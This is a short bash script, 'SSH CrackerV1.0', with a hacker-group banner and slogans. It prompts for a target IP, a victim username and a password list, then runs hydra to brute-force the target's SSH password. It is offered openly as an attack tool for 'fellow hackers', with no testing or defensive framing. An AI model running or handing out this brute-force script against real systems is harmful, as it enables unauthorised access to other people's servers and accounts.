#!/bin/bash
clear
      echo
# Another one of my simple @ss scripts for all my fellow hackers
 echo
   echo
echo "#------------------------------------------------------------------------------------------# "
echo "#           _____ _____ __ __         __  ____    ____    __  __  _    ___  ____           # "                
echo "#          / ___// ___/|  |  |       /  ]|    \  /    |  /  ]|  |/ ]  /  _]|    \          # "                
echo "#         (   \_(   \_ |  |  |      /  / |  D  )|  o  | /  / |  ' /  /  [_ |  D  )         # "                
echo "#          \__  |\__  ||  _  |     /  /  |    / |     |/  /  |   \  |    _]|    /          # "                
echo "#         /  \  |/  \ ||  |  |    /   \_ |   \  |  _  /   \_ |     \|   [_ |    \          # "                
echo "#          \    |\    ||  |  |    \     ||  .  \|  |  \     ||  .  ||     ||  .  \         # "                
echo "#           \___| \___||__|__|     \____||__|\_||__|__|\____||__|\_||_____||__|\_|         # "                
echo "#------------------------------------------------------------------------------------------# "
echo "#                  Welcome to the digital world!       {We Are Muslims Hackers}            # "
echo "# SSH CrackerV1.0                 Security!            {We are Anoymous Arabs}             # "
echo "#                                 hackers!             {We Are Legion}                     # "
echo "# <By Oseid Aldary><Joker11>                           {We Are Don't Forgive}              # "
echo "#                                                      {we Are Don't Forget}               # "
echo "#                                                      {expect us}                         # "
echo "#                                                                                          # "
echo "# For Help Please Visit My Account{https://www.facebook.com/profile.php?id=100017170449859}# "
echo "#------------------------------------------------------------------------------------------# "
echo
echo "                                  Please witing :) .....                                     "
echo  
   echo
       echo                                                       

     echo
echo 

echo

  echo
sleep 7
clear
     echo
 echo
echo
  echo
# This command reads the Ip address of the vixtim
echo " Enter TARGET IP Example: 192.168.1.100"
read -e VIP
 clear
     echo
echo
    echo
echo
# This command reads the user name of the victim
echo " Enter target username to attack  : Example: oseid "
read -e VICTIM
clear
   echo
echo
   echo
echo
# This command reads the location of the dictionary file you are using for the attack
echo "Enter password list location : Example: /root/Desktop/pass.txt "
read -e DICT
   echo
echo
       echo
echo
# This is the output of all instructions thrown into hydra to brute force the SSH password
echo
  echo
echo
echo "                          Attacking was started for you!"
  echo
   echo
echo
  echo
hydra -l $VICTIM -P $DICT -t 16 $VIP ssh
echo
  echo
echo
# This command is just stupid no use even being here : )
  echo ""
sleep 8 
     echo
  echo
   echo
echo
echo "thanks for using :) Good Day "
   exit


